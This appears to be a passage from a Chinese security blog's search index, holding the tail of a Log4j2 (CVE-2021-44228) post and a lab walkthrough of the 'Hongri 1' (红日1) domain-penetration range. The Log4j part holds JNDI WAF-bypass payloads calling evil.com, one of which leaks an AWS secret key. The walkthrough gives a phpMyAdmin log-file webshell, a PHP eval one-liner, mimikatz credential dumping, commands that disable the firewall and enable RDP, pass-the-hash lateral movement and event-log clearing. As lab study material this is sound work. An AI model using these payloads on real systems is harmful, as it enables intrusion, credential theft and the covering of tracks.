class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">45</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">7</span>d HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">20060</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">134.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">11324</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">cmd: <span class="built_in">ls</span> /tmp</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2021-44228-Log4j2/9.png"></p><h4 id="o78IB">绕waf</h4><h5 id="WCjBO">Log4j2混淆绕过waf/流量特征</h5>[Log4j一些WAF绕过技巧 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17876672.html)<h6 id="suFLP">利用 Lookup 语法变形</h6>1.可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字<blockquote><p><code>:-</code> 的作用是用来指定一个默认值。当 lookup 函数找不到指定的变量或值时，它会返回 <code>:-</code> 后面指定的默认值。</p></blockquote><p>s[:::::-j)${what:-n}${ls:-d}${1QAZ2wxs:-i}</p><p>${j${sdasd:-n}d${sddd:-i}:ldap:&#x2F;&#x2F;dns.log}</p><h6 id="Q6StV">环境变量与系统属性注入</h6>**环境变量读取**：利用 `env` Lookup 动态构造 Payload，例如：<ul><li>java复制</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://evil.com/z?leak=$&#123;env:AWS_SECRET_ACCESS_KEY&#125;&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi:$&#123;env:ENV_NAME:-l&#125;dap://evil.com/z&#125;</span><br></pre></td></tr></table></figure><p>通过读取环境变量或动态拼接绕过静态检测7。</p><p><strong>系统属性注入</strong>：利用 <code>sys</code> Lookup 构造动态协议：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;sys:SYS_NAME:<span class="literal">-i</span>&#125;:ldap://evil.com/z&#125;</span><br></pre></td></tr></table></figure><p>若系统属性 <code>SYS_NAME</code> 不存在，则默认使用 <code>i</code> 补全7。</p><p>2.虽然除了JNDI之外的核心包里的Lookup不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步操作</p><h6 id="OJY3U">解析绕过</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">#evil.com/z&#125;  // 利用 `#` 分割主机名</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span>`/Exploit&#125;    // 使用反引号触发 URI 解析错误</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;<span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;a&quot;</span>:<span class="string">&quot;a:-i&#125;:ld<span class="variable">$</span>&#123;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;next&quot;</span>: <span class="string">&quot;o:-a&#125;p://evil.com/z&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日1</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<h1 id="MsYgn">环境搭建</h1>安装好三台靶机<p>默认密码为</p><p>hongrisec@2019</p><p>配置两张网卡  NAT和vm1</p><p><img src="/img/%E7%BA%A2%E6%97%A51/1.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/2.png"></p><p>查看网卡配置成功</p><h2 id="vM2Iz">配置kali（vps）</h2>一张网卡，NAT模拟公网<p>192.168.5.129</p><h2 id="t0xid">配置win7（web服务器跳板机）</h2>(NAT、VMnet1- 52.0/24)<p>改密码为hongrisec@2025</p><p>首次登录成功后，需要进行重启，否则phpstudy可能启动不了</p><p><img src="/img/%E7%BA%A2%E6%97%A51/3.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/4.png"></p><p>配置成功</p><p>cmd检查一下，如果这里没显示两个不同网段的ip，那么就去修改网卡，直到成功为止</p><p>这里注意 第一个网卡固定为192.168.52.0&#x2F;24</p><p>所以将网卡2改为NAT以模拟外网</p><p><img src="/img/%E7%BA%A2%E6%97%A51/5.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/6.png"></p><h2 id="cJu1g"><font style="color:rgb(79, 79, 79);">域内主机 Win2k3（VMnet3- 52.141）</font></h2>显示要修改密码<p>修改为hongrisec@2025</p><p><img src="/img/%E7%BA%A2%E6%97%A51/7.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/8.png"></p><h2 id="qKUDT"><font style="color:rgb(79, 79, 79);">域控 </font><font style="color:rgb(78, 161, 219) !important;">Server</font><font style="color:rgb(79, 79, 79);"> 2008 R2（VMnet3 - 52.138）</font></h2>同样需要修改密码<p>修改为hongrisec@2025</p><p><img src="/img/%E7%BA%A2%E6%97%A51/9.png"></p><h1 id="CaDm4">环境</h1>同下 配置成功<p><img src="/img/%E7%BA%A2%E6%97%A51/10.png"></p><p>模拟外网网段：192.168.5.0&#x2F;24</p><p>模拟内网网段：192.168.52.0&#x2F;24</p><p>攻击机</p><p>win11:192.168.5.1</p><p>kali:192.168.5.129</p><h1 id="SW3VX">信息收集</h1>`fs.exe -h 192.168.5.130-255`#这里这么扫是因为避开扫kali和物理机，正常应该为xxx.xxx.xxx.0/24<p><img src="/img/%E7%BA%A2%E6%97%A51/11.png"></p><p>端口</p><p>192.168.5.130:80 open</p><p>192.168.5.130:3306 open</p><p>[*] alive ports len is: 2</p><p>start vulscan</p><p>[*] WebTitle <a href="http://192.168.72.128/">http://192.168.72.128</a>     code:200 len:14749  title:phpStudy 探针 2014</p><h1 id="uFaX0">外网打点</h1>访问80端口为phpinfo<p><img src="/img/%E7%BA%A2%E6%97%A51/12.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/13.png"></p><p>尝试弱口令root和root，成功连接</p><p><img src="/img/%E7%BA%A2%E6%97%A51/14.png"></p><p>使用工具直接连 连不上</p><p>dirsearch 扫一下目录</p><p>python dirsearch.py -u “<a href="http://10.10.0.101"/">http://192.168.5.130"</a></p><p><img src="/img/%E7%BA%A2%E6%97%A51/15.png"></p><p>扫出来phpmyadmin</p><p><a href="http://10.10.0.101/phpmyadmin/">http://192.168.5.130/phpmyadmin/</a></p><p>直接访问，使用刚刚的弱口令登录成功</p><p><img src="/img/%E7%BA%A2%E6%97%A51/16.png"></p><p>发现有个newyxcms的数据库</p><p>phpmyadmin可以尝试写文件getshell</p><hr><p>前提条件:</p><p>需要知道此网站的绝对路径</p><p>此网站目录是否可写</p><p>secure_file_priv没有值</p><hr><p><font style="color:rgb(0, 0, 0);">secure_file_priv是用来限制在那个目录下有读写权限的，再mysql 5.6.34版本后是默认NULL的，此mysql的版本为5.5.53并没有大于5.6.34 </font></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当它的值为NULL时，则表示不允许进行读写</span><br><span class="line">当它的值为一个路径时(例如/tmp),则表示只能再/tmp目录下读写 </span><br><span class="line">当它没有值时，则表示没有限制</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A51/17.png"></p><p>刚刚的探针显示了绝对路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(30, 107, 184);"></font></p><p><img src="/img/%E7%BA%A2%E6%97%A51/18.png"></p><p>执行发现思路断了</p><p>再查看日志记录开启没</p><p><img src="/img/%E7%BA%A2%E6%97%A51/19.png"></p><p>默认关闭，那我们执行命令开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;general_log&#x27;;   #可以查看日志的读写是否开启</span><br><span class="line"></span><br><span class="line">set global general_log = on;           #开启此功能</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A51/20.png"></p><p><font style="color:rgb(0, 0, 0);">开启功能成功，将日志文件的地址改为web目录下的php文件</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;general_log_file&#x27;;      </span><br><span class="line">#查看日志的默认路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;         </span><br><span class="line">#修改路径修改完地址，直接通过select来写入一下</span><br></pre></td></tr></table></figure><p>再次查询已经修改成功</p><p><img src="/img/%E7%BA%A2%E6%97%A51/21.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_REQUEST[1]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A51/22.png"></p><p>哥斯拉也连接成功</p><p>另一种方式</p><p>那么前面还发现了yxcms</p><p>fuzz一下，发现<a href="http://10.10.0.101/yxcms/">http://192.168.5.130/yxcms/</a></p><p>能直接访问</p><p><img src="/img/%E7%BA%A2%E6%97%A51/23.png"></p><p>并且从公告中发现了弱口令</p><p><a href="http://10.10.0.101/yxcms//index.php?r=admin/index/login">http://10.10.0.101/yxcms//index.php?r=admin/index/login</a></p><p><img src="/img/%E7%BA%A2%E6%97%A51/24.png"></p><p>由于是靶场 找到配置文件</p><p>直接修改为一句话木马</p><p><img src="/img/%E7%BA%A2%E6%97%A51/25.png"></p><p>蚁剑直接连</p><p><img src="/img/%E7%BA%A2%E6%97%A51/26.png"></p><p>发现权限为管理员</p><p><img src="/img/%E7%BA%A2%E6%97%A51/27.png"></p><p>那么接下来我们需要cs上线</p><p><img src="/img/%E7%BA%A2%E6%97%A51/28.png"></p><p>admin权限，所以我们直接一键提权</p><p><img src="/img/%E7%BA%A2%E6%97%A51/29.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/30.png"></p><h1 id="w1lkx">后渗透</h1><h2 id="ZrJOi">内网信息收集</h2>ipconfig /all<p>查看到一个ip地址为<font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">192.168.52.143</font></p><p>其dns服务器为<font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">192.168.52.138</font></p><p><img src="/img/%E7%BA%A2%E6%97%A51/31.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/32.png"></p><p>发现域控为owa.god.org</p><p>ping一下，确定ip为192.168.52.138</p><p><img src="/img/%E7%BA%A2%E6%97%A51/33.png"></p><p>然后再net view &#x2F;domain</p><p>查看当前域,是存在GOD域的，既然有域，那么目标就清晰了，需要拿下域控</p><p><img src="/img/%E7%BA%A2%E6%97%A51/34.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/35.png"></p><p>进行网络探测和端口扫描</p><p>加上已控制的跳板机web，共有3台机</p><p><img src="/img/%E7%BA%A2%E6%97%A51/36.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/37.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">域用户</span><br><span class="line">administrator</span><br><span class="line">ligang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域机器</span><br><span class="line">OWA.god.org <span class="number">192.168</span>.<span class="number">52.138</span> 域控</span><br><span class="line">ROOT<span class="literal">-TVI862UBEH</span>.god.org <span class="number">192.168</span>.<span class="number">52.141</span> 域内机器</span><br><span class="line">stu1.god.org <span class="number">192.168</span>.<span class="number">52.143</span> 域内机器(已拿下)</span><br></pre></td></tr></table></figure><p>接下来先尝试拿下192.168.52.141</p><h2 id="oSX4q">拿下域内主机</h2><p>方法一</p><p>上传mimikatz抓取密码(最好还是用蚁剑传，因为cs不是交互式)</p><p><img src="/img/%E7%BA%A2%E6%97%A51/38.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/39.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPassword</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者方法二<img src="/img/%E7%BA%A2%E6%97%A51/40.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/41.png"></p><p>然后开启3389端口和关闭防火墙</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable      <span class="comment">#winsows server 2003 之前</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  <span class="comment">#winsows server 2003 之后</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Open 3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A51/42.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/43.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/44.png"></p><p>注意是god&#x2F;administrator</p><p>已连上</p><p><img src="/img/%E7%BA%A2%E6%97%A51/45.png"></p><p>下面是通过哈希传递攻击PTH拿下域控主机</p><blockquote><p><font style="color:rgb(0, 0, 0);">在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</font></p><p><font style="color:rgb(0, 0, 0);">1.获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值</font></p><p><font style="color:rgb(0, 0, 0);">2.通过哈希传递攻击尝试登录其他主机</font></p><p><font style="color:rgb(0, 0, 0);">3.继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域</font></p></blockquote><p>前面就已经抓取过了</p><p><img src="/img/%E7%BA%A2%E6%97%A51/46.png"></p><p>NTLM     : ad8b1b80e5d43bd61ab6796242bc7daa</p><p>创建smb监听器</p><p><img src="/img/%E7%BA%A2%E6%97%A51/47.png"></p><p>使用psexec进行横向</p><p><img src="/img/%E7%BA%A2%E6%97%A51/48.png"></p><p>先横192.168.52.141吧</p><p><img src="/img/%E7%BA%A2%E6%97%A51/49.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/50.png"></p><p>成功上线</p><p><img src="/img/%E7%BA%A2%E6%97%A51/51.png"></p><p>重复操作</p><p>拿下域控</p><p><img src="/img/%E7%BA%A2%E6%97%A51/52.png"></p><p><img src="/img/%E7%BA%A2%E6%97%A51/53.png"></p><p>痕迹清理</p><p>win7</p><p>wevtutil cl system 清除系统日志<br>wevtutil cl application 清除应用程序日志<br>wevtutil cl security 清除安全日志<br>netsh interface portproxy show all 查看转发的端口情况<br>netsh interface portproxy delete v4tov4 listenaddress&#x3D;192.168.52.143 listenport&#x3D;5557 清理转发的端口</p><p><a href="https://mp.weixin.qq.com/s/UKbUQkVkl3aNJ9NCN4IngA">https://mp.weixin.qq.com/s/UKbUQkVkl3aNJ9NCN4IngA</a></p><h1 id="fDJqT">总结</h1>![](/img/红日1/54.png)<ol><li>整理一下<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">phpmyadmin的getshell方法</font></li><li><font style="color:#000000;background-color:rgba(255, 255, 255, 0);">简单熟悉了一下工具的使用和环境的搭建</font></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
